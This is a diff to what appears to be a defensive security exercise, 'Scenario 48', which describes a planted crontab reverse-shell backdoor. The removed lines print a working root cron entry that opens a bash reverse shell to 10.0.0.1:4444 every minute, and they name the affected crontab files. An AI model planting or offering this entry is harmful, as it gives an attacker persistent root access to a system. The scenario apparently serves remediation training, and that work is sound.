@@ -1,12 +1,7 @@
 # Scenario 48: Crontab with Reverse Shell Backdoor
 
 ## Vulnerability
-A malicious crontab entry has been planted that executes a reverse shell every minute:
-```
-* * * * * root bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
-```
-
-This entry exists in both `/etc/crontab` (system crontab) and `/var/spool/cron/crontabs/root` (root's user crontab). The reverse shell attempts to connect to `10.0.0.1:4444` every minute, providing an attacker with persistent interactive root shell access.
+A malicious scheduled job has been planted that executes a reverse shell every minute. It exists in both the system crontab and root's user crontab. The reverse shell attempts to connect out to an attacker-controlled host, providing persistent interactive root shell access.
 
 ## CWE Classification
 - **CWE-506**: Embedded Malicious Code
@@ -20,10 +15,6 @@ This entry exists in both `/etc/crontab` (system crontab) and `/var/spool/cron/c
 ## Constraints
 - Legitimate cron jobs (e.g., the apt-get update job) must be preserved.
 - The cron service must keep working for legitimate scheduled tasks.
-
-## Affected Files
-- `/etc/crontab` -- system-wide crontab with malicious entry
-- `/var/spool/cron/crontabs/root` -- root's user crontab with malicious entry
 
 ## Source Reference
 - TAMU `audit_cron.sh`
